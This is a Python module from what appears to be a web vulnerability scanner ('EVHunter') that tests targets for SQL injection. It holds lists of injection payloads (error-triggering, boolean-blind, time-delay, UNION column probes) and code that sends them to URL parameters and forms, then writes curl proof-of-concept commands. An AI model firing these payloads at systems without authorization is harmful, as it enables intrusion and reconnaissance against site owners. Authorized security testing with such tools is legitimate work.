"""
EVHunter — SQL Injection Tester  v1.0
Replaces the misnamed duplicate of xss_analyzer.py.

Techniques:
  - Error-based detection (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  - Boolean-based blind (response length + content comparison)
  - Time-based blind (SLEEP / pg_sleep / WAITFOR DELAY)
  - UNION-based column-count probing
  - Multi-method: GET params, POST forms, crawler-discovered params
"""

import re
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Optional

from rich.console import Console
from rich.table import Table
from rich import box

from .base import ScannerModule

console = Console()

# ── Error patterns keyed by DB engine ────────────────────────────────────────

SQL_ERROR_PATTERNS: list[tuple[str, str]] = [
    # MySQL
    (r"you have an error in your sql syntax",             "MySQL"),
    (r"warning.*?mysql_",                                 "MySQL"),
    (r"mysql_fetch_array\(\)",                            "MySQL"),
    (r"mysql\.connector",                                 "MySQL"),
    (r"call to a member function.*?fetch",                "MySQL"),
    (r"supplied argument is not a valid mysql",           "MySQL"),
    (r"table '.*?' doesn't exist",                        "MySQL"),
    # PostgreSQL
    (r"pg_query\(\).*?failed",                            "PostgreSQL"),
    (r"pgsql error",                                      "PostgreSQL"),
    (r"syntax error at or near",                          "PostgreSQL"),
    (r"unterminated quoted string at or near",            "PostgreSQL"),
    (r"invalid input syntax for",                         "PostgreSQL"),
    (r"pdo::prepare\(\).*?failed",                        "PostgreSQL"),
    (r"psycopg2",                                         "PostgreSQL"),
    # MSSQL
    (r"unclosed quotation mark after the character string","MSSQL"),
    (r"microsoft ole db.*?sql server",                    "MSSQL"),
    (r"\[sql server\]",                                   "MSSQL"),
    (r"incorrect syntax near",                            "MSSQL"),
    (r"odbc.*?driver.*?sql server",                       "MSSQL"),
    (r"sqlexception",                                     "MSSQL"),
    # Oracle
    (r"ora-\d{4,5}",                                      "Oracle"),
    (r"oracle.*?error",                                   "Oracle"),
    (r"quoted string not properly terminated",            "Oracle"),
    (r"pl/sql.*?error",                                   "Oracle"),
    # SQLite
    (r"sqlite3\.operationalerror",                        "SQLite"),
    (r"unrecognized token",                               "SQLite"),
    (r"sqlite_master",                                    "SQLite"),
    # Generic
    (r"sql syntax.*?error",                               "Generic"),
    (r"database.*?error",                                 "Generic"),
    (r"db query failed",                                  "Generic"),
    (r"sql.*?exception",                                  "Generic"),
    (r"jdbc.*?exception",                                 "Generic"),
    (r"com\.mysql\.jdbc",                                 "Generic"),
]

# ── Error-triggering payloads ─────────────────────────────────────────────────

ERROR_PAYLOADS: list[str] = [
    "'",
    '"',
    "''",
    "1'",
    '1"',
    "1' OR '1'='1",
    "' OR 1=1--",
    "1 UNION SELECT NULL--",
    "') OR ('1'='1",
    "1; SELECT 1--",
]

# ── Boolean-based payload pairs (true_payload, false_payload) ─────────────────

BOOLEAN_PAIRS: list[tuple[str, str]] = [
    ("1 AND 1=1-- -",     "1 AND 1=2-- -"),
    ("1' AND '1'='1'-- -","1' AND '1'='2'-- -"),
    ("1 AND 1=1",         "1 AND 1=2"),
    ("' OR 1=1-- -",      "' OR 1=2-- -"),
    ("1) AND (1=1",       "1) AND (1=2"),
]

# ── Time-based payloads (db_label, payload, expected_min_delay_seconds) ──────

TIME_PAYLOADS: list[tuple[str, str, float]] = [
    ("MySQL",      "1' AND SLEEP(4)-- -",             4.0),
    ("MySQL",      "1 AND SLEEP(4)-- -",              4.0),
    ("PostgreSQL", "1' AND pg_sleep(4)-- -",           4.0),
    ("PostgreSQL", "1; SELECT pg_sleep(4)-- -",        4.0),
    ("MSSQL",      "1'; WAITFOR DELAY '0:0:4'-- -",   4.0),
    ("MSSQL",      "1 WAITFOR DELAY '0:0:4'-- -",     4.0),
]

# ── UNION column-count probes ─────────────────────────────────────────────────

UNION_PROBES: list[str] = [
    "1 ORDER BY 1--",
    "1 ORDER BY 2--",
    "1 ORDER BY 3--",
    "1 ORDER BY 10--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
]

# Common parameter names to probe when a URL has no query string
COMMON_INJECTABLE_PARAMS: list[str] = [
    "id", "page", "item", "cat", "category", "product", "user",
    "name", "search", "q", "order", "sort", "by", "pid", "cid",
    "uid", "tid", "aid", "num", "p",
]

TIME_THRESHOLD   = 3.5   # seconds — trigger for time-based confirmation
BOOL_LEN_DELTA   = 100   # bytes — minimum length diff for boolean blind
SEV_COLOR = {"critical": "bold red", "high": "red", "medium": "yellow", "low": "cyan"}


class SQLiTesterModule(ScannerModule):
    name        = "sqli"
    description = "SQL injection testing — error-based, boolean-blind, time-based, UNION"

    def run(
        self,
        target:         str,
        urls:           list[str]  = None,
        forms:          list[dict] = None,
        crawler_params: dict       = None,
        max_urls:       int        = 20,
        **kwargs,
    ) -> dict[str, Any]:
        self._start_timer()
        self._status(f"SQL injection testing on [cyan]{target}[/cyan]…")

        base_url  = target if target.startswith("http") else f"https://{target}"
        test_urls = (urls or [base_url])[:max_urls]

        result: dict[str, Any] = {
            "ok":              True,
            "target":          target,
            "vulnerabilities": [],
            "summary":         "",
        }

        # 1. URL parameter testing
        for url in test_urls:
            self._test_url(url, result)

        # 2. Form testing
        for form in (forms or [])[:15]:
            self._test_form(form, result)

        # 3. Crawler-discovered params
        for url, params in (crawler_params or {}).items():
            for param in params:
                if not self._already_found(url, param, result):
                    self._test_single_param(url, param, "GET", None, result)

        result["vulnerabilities"] = self._dedup(result["vulnerabilities"])

        n     = len(result["vulnerabilities"])
        color = "red" if n else "green"
        result["summary"] = (
            f"Found {n} SQL injection vulnerability(ies)" if n
            else "No SQL injection vulnerabilities detected"
        )
        self._ok(
            f"SQLi done — [bold {color}]{n}[/bold {color}] issue(s) [{self._elapsed()}]"
        )
        if n:
            self._print_table(result)
        return result

    # ── URL testing ────────────────────────────────────────────────────────────

    def _test_url(self, url: str, result: dict):
        parsed = urllib.parse.urlparse(url)
        params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

        if not params:
            # Probe common injectable param names
            for p in COMMON_INJECTABLE_PARAMS:
                probe_url = self._build_url(url, {p: "1"})
                resp = self._get(probe_url)
                if resp and resp["status"] == 200:
                    self._test_single_param(url, p, "GET", None, result)
            return

        for param in params:
            self._test_single_param(url, param, "GET", None, result)

    # ── Form testing ───────────────────────────────────────────────────────────

    def _test_form(self, form: dict, result: dict):
        action  = form.get("action", "")
        method  = form.get("method", "GET").upper()
        inputs  = form.get("inputs", [])

        if not action or not inputs or form.get("file_upload"):
            return

        for param in inputs[:8]:
            if not self._already_found(action, param, result):
                base_data = {i: "test" for i in inputs}
                self._test_single_param(action, param, method, base_data, result)

    # ── Core single-param tester ───────────────────────────────────────────────

    def _test_single_param(
        self,
        url:       str,
        param:     str,
        method:    str,
        base_data: Optional[dict],
        result:    dict,
    ):
        if self._already_found(url, param, result):
            return

        baseline = self._make_request(url, param, "1", method, base_data)
        if not baseline:
            return

        # Stage 1: Error-based (fastest, most reliable)
        if self._error_based(url, param, method, base_data, baseline, result):
            return

        # Stage 2: Boolean-based (only if baseline is 200)
        if baseline["status"] == 200:
            if self._boolean_based(url, param, method, base_data, baseline, result):
                return

        # Stage 3: Time-based (slow — limit to 3 payloads)
        self._time_based(url, param, method, base_data, result)

    # ── Stage 1: Error-based ──────────────────────────────────────────────────

    def _error_based(
        self,
        url:       str,
        param:     str,
        method:    str,
        base_data: Optional[dict],
        baseline:  dict,
        result:    dict,
    ) -> bool:
        for payload in ERROR_PAYLOADS[:7]:
            resp = self._make_request(url, param, payload, method, base_data)
            if not resp:
                continue

            body_lower = resp["body"].lower()
            for pattern, db_type in SQL_ERROR_PATTERNS:
                if re.search(pattern, body_lower):
                    # Confirm the error wasn't already in the baseline
                    if not re.search(pattern, baseline["body"].lower()):
                        result["vulnerabilities"].append({
                            "type":     f"Error-Based SQLi ({db_type})",
                            "url":      url,
                            "param":    param,
                            "payload":  payload,
                            "severity": "critical",
                            "db_type":  db_type,
                            "evidence": self._extract_snippet(body_lower, pattern),
                            "detail": (
                                f"SQL error in param '{param}' — "
                                f"{db_type} error pattern matched"
                            ),
                            "curl_poc": self._build_curl(url, param, payload, method, base_data),
                        })
                        color = SEV_COLOR.get("critical", "red")
                        console.print(
                            f"  [{color}]  ⚡ CRITICAL SQLi ({db_type}) "
                            f"in '{param}' @ {url[:60]}[/{color}]"
                        )
                        return True
        return False

    # ── Stage 2: Boolean-based ────────────────────────────────────────────────

    def _boolean_based(
        self,
        url:       str,
        param:     str,
        method:    str,
        base_data: Optional[dict],
        baseline:  dict,
        result:    dict,
    ) -> bool:
        baseline_len = baseline["length"]

        for true_pl, false_pl in BOOLEAN_PAIRS:
            resp_t = self._make_request(url, param, true_pl,  method, base_data)
            resp_f = self._make_request(url, param, false_pl, method, base_data)

            if not resp_t or not resp_f:
                continue

            true_diff  = abs(resp_t["length"] - baseline_len)
            false_diff = abs(resp_f["length"] - baseline_len)

            # True condition ≈ baseline; false condition significantly differs
            if (
                true_diff  < 50 and
                false_diff > BOOL_LEN_DELTA and
                resp_t["status"] == 200 and
                resp_f["status"] in (200, 404)
            ):
                result["vulnerabilities"].append({
                    "type":     "Boolean-Based Blind SQLi",
                    "url":      url,
                    "param":    param,
                    "payload":  true_pl,
                    "severity": "high",
                    "db_type":  "Unknown",
                    "evidence": (
                        f"TRUE→{resp_t['length']}B (Δ{true_diff}B) | "
                        f"FALSE→{resp_f['length']}B (Δ{false_diff}B) | "
                        f"baseline→{baseline_len}B"
                    ),
                    "detail": (
                        f"Param '{param}' responds differently to "
                        f"true/false SQL conditions (boolean-blind)"
                    ),
                    "curl_poc": self._build_curl(url, param, true_pl, method, base_data),
                })
                console.print(
                    f"  [red]  ⚡ HIGH Boolean-Blind SQLi in '{param}' @ {url[:60]}[/red]"
                )
                return True
        return False

    # ── Stage 3: Time-based ───────────────────────────────────────────────────

    def _time_based(
        self,
        url:       str,
        param:     str,
        method:    str,
        base_data: Optional[dict],
        result:    dict,
    ) -> bool:
        # Limit to 3 payloads to keep scan speed reasonable
        for db_type, payload, min_delay in TIME_PAYLOADS[:3]:
            t0      = time.time()
            resp    = self._make_request(url, param, payload, method, base_data, timeout=14)
            elapsed = time.time() - t0

            if resp and elapsed >= TIME_THRESHOLD:
                result["vulnerabilities"].append({
                    "type":     f"Time-Based Blind SQLi ({db_type})",
                    "url":      url,
                    "param":    param,
                    "payload":  payload,
                    "severity": "high",
                    "db_type":  db_type,
                    "evidence": f"Response delayed {elapsed:.1f}s (threshold: {TIME_THRESHOLD}s)",
                    "detail": (
                        f"Param '{param}' caused {elapsed:.1f}s delay — "
                        f"{db_type} time-based injection"
                    ),
                    "curl_poc": self._build_curl(url, param, payload, method, base_data),
                })
                console.print(
                    f"  [red]  ⚡ HIGH Time-Blind SQLi ({db_type}) "
                    f"in '{param}' @ {url[:60]}[/red]"
                )
                return True
        return False

    # ── HTTP helpers ──────────────────────────────────────────────────────────

    def _make_request(
        self,
        url:       str,
        param:     str,
        value:     str,
        method:    str           = "GET",
        base_data: Optional[dict]= None,
        timeout:   int           = None,
    ) -> Optional[dict]:
        timeout = timeout or self.timeout
        try:
            if method == "POST":
                data          = dict(base_data or {})
                data[param]   = value
                return self._post(url, data, timeout)
            else:
                test_url = self._build_url(url, {param: value})
                return self._get(test_url, timeout)
        except Exception:
            return None

    def _get(self, url: str, timeout: int = None) -> Optional[dict]:
        try:
            req = urllib.request.Request(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (compatible; EVHunter/3.0)",
                    "Accept":     "text/html,*/*",
                },
            )
            with urllib.request.urlopen(req, timeout=timeout or self.timeout) as resp:
                body = resp.read(200_000).decode("utf-8", errors="replace")
                return {"status": resp.status, "body": body, "length": len(body)}
        except urllib.error.HTTPError as e:
            body = e.read(10_000).decode("utf-8", errors="replace") if e.fp else ""
            return {"status": e.code, "body": body, "length": len(body)}
        except Exception:
            return None

    def _post(self, url: str, data: dict, timeout: int = None) -> Optional[dict]:
        try:
            encoded = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(
                url,
                data=encoded,
                headers={
                    "User-Agent":   "Mozilla/5.0 (compatible; EVHunter/3.0)",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
            with urllib.request.urlopen(req, timeout=timeout or self.timeout) as resp:
                body = resp.read(200_000).decode("utf-8", errors="replace")
                return {"status": resp.status, "body": body, "length": len(body)}
        except urllib.error.HTTPError as e:
            body = e.read(10_000).decode("utf-8", errors="replace") if e.fp else ""
            return {"status": e.code, "body": body, "length": len(body)}
        except Exception:
            return None

    # ── Utilities ─────────────────────────────────────────────────────────────

    @staticmethod
    def _build_url(url: str, params: dict) -> str:
        parsed   = urllib.parse.urlparse(url)
        existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        merged   = {k: v[0] if isinstance(v, list) else v for k, v in existing.items()}
        merged.update(params)
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(merged)))

    def _build_curl(
        self,
        url:       str,
        param:     str,
        payload:   str,
        method:    str,
        base_data: Optional[dict],
    ) -> str:
        if method == "POST":
            data        = dict(base_data or {})
            data[param] = payload
            data_str    = "&".join(
                f"{k}={urllib.parse.quote(str(v))}" for k, v in data.items()
            )
            return f"curl -sk -X POST '{url}' -d '{data_str}'"
        else:
            test_url = self._build_url(url, {param: payload})
            return f"curl -sk '{test_url}'"

    @staticmethod
    def _extract_snippet(body: str, pattern: str) -> str:
        """Return a short context string around the matched error."""
        m = re.search(pattern, body)
        if not m:
            return ""
        start = max(0, m.start() - 20)
        end   = min(len(body), m.end() + 80)
        return body[start:end].replace("\n", " ").strip()[:150]

    @staticmethod
    def _already_found(url: str, param: str, result: dict) -> bool:
        return any(
            v["url"] == url and v["param"] == param
            for v in result["vulnerabilities"]
        )

    @staticmethod
    def _dedup(vulns: list) -> list:
        seen, out = set(), []
        for v in vulns:
            key = f"{v['url']}|{v['param']}|{v['type']}"
            if key not in seen:
                seen.add(key)
                out.append(v)
        return out

    # ── Display ───────────────────────────────────────────────────────────────

    def _print_table(self, result: dict):
        vulns = result["vulnerabilities"]
        if not vulns:
            return
        tbl = Table(
            title=f"  [bold red]💉 SQL Injection Findings ({len(vulns)})[/bold red]",
            box=box.SIMPLE_HEAVY,
            header_style="bold cyan",
            border_style="bright_red",
        )
        tbl.add_column("Severity", width=10)
        tbl.add_column("Type",     max_width=35)
        tbl.add_column("Param",    max_width=18, style="cyan")
        tbl.add_column("DB",       width=12)
        tbl.add_column("URL",      max_width=40, style="dim")
        for v in vulns:
            sev   = v.get("severity", "high")
            color = SEV_COLOR.get(sev, "white")
            tbl.add_row(
                f"[{color}]{sev.upper()}[/{color}]",
                v.get("type", "?")[:35],
                v.get("param", "?")[:18],
                v.get("db_type", "?")[:12],
                v.get("url", "?")[:40],
            )
        console.print(tbl)
